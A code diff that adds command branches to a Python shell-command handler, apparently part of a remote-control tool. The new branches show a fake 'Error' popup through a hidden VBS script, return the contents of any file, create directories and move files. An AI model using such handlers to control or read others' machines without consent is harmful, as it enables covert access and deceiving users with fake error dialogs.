@@ -331,6 +331,26 @@ def execute_shell_command(cmd_str):
         if cmd_lower == "cd" and len(cmd_str.strip()) == 2:
             return current_working_dir
 
+        # Handle error command
+        if cmd_lower.startswith("__error__"):
+            try:
+                message = "Error"
+                if ":" in cmd_str:
+                    parts = cmd_str.split(":", 1)
+                    if len(parts) > 1:
+                        message = parts[1].strip()
+
+                vbs_path = os.path.join(tempfile.gettempdir(), "telelluc_error_custom.vbs")
+                vbs_content = f'MsgBox "{message}", 16 + 65536 + 4096, "Message"\n'
+                with open(vbs_path, "w", encoding="utf-8") as f:
+                    f.write(vbs_content)
+
+                subprocess.Popen(["wscript.exe", vbs_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
+                return f"Message popup triggered: {message}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
         # Handle shutdown command
         if cmd_lower.startswith("__shutdown__"):
             try:
@@ -384,6 +404,55 @@ def execute_shell_command(cmd_str):
                 with open(full_path, "w", encoding="utf-8") as f:
                     f.write(content)
                 return f"File saved: {filename}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle cat command
+        if cmd_lower.startswith("cat "):
+            filename = cmd_str[4:].strip().strip('"').strip("'")
+            try:
+                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
+                if not os.path.exists(full_path):
+                    return f"Error: File not found: {filename}"
+                if os.path.isdir(full_path):
+                    return f"Error: {filename} is a directory"
+                with open(full_path, "r", encoding="utf-8", errors="replace") as f:
+                    content = f.read()
+                return content if content else "(empty file)"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle mkdir command
+        if cmd_lower.startswith("mkdir "):
+            dirname = cmd_str[6:].strip().strip('"').strip("'")
+            try:
+                full_path = os.path.abspath(os.path.join(current_working_dir, dirname))
+                if os.path.exists(full_path):
+                    return f"Error: Directory already exists: {dirname}"
+                os.makedirs(full_path)
+                return f"Directory created: {dirname}"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle move command
+        if cmd_lower.startswith("move "):
+            parts = cmd_str.split(None, 2)
+            if len(parts) < 3:
+                return "Error: move requires source and destination"
+            source = parts[1].strip().strip('"').strip("'")
+            dest = parts[2].strip().strip('"').strip("'")
+            try:
+                source_path = os.path.abspath(os.path.join(current_working_dir, source))
+                dest_path = os.path.abspath(os.path.join(current_working_dir, dest))
+                if not os.path.exists(source_path):
+                    return f"Error: File not found: {source}"
+                import shutil
+                if os.path.isdir(source_path):
+                    shutil.move(source_path, dest_path)
+                    return f"Directory moved: {source} -> {dest}"
+                else:
+                    shutil.move(source_path, dest_path)
+                    return f"File moved: {source} -> {dest}"
             except Exception as e:
                 return f"Error: {str(e)}"
 
